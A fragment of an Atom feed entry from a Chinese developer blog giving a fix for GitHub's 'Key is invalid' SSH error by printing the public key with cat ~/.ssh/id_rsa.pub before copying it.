    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="git错误整理"><a href="#git错误整理" class="headerlink" title="git错误整理"></a>git错误整理</h2><h3 id="1-Key-is-invalid-You-must-supply-a-key-in-OpenSSH-public-key-format"><a href="#1-Key-is-invalid-You-must-supply-a-key-in-OpenSSH-public-key-format" class="headerlink" title="1. Key is invalid. You must supply a key in OpenSSH public key format"></a>1. Key is invalid. You must supply a key in OpenSSH public key format</h3><p>Github添加公开秘钥的时候，如果直接粘贴复制往往会收到这样一个报错：</p><p><code>Key is invalid. You must supply a key in OpenSSH public key format</code></p><p>这个原因是因为：</p><p>直接粘贴复制会破坏.ssh文件的格式<br>解决办法是：使用cat命令将 <code>~/.ssh/id_rsa.pub</code> 内容输出到终端，再拷贝。<br><code>cat ~/.ssh/id_rsa.pub</code></p>]]></content>
    
    
    <summary type="html">git常见错误整理</summary>
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="git" scheme="https://seniortesting.club/tags/git/"/>
    
    <category term="github" scheme="https://seniortesting.club/tags/github/"/>
    
    <category term="github ssh" scheme="https://seniortesting.club/tags/github-ssh/"/>
    
  </entry>
  
</feed>
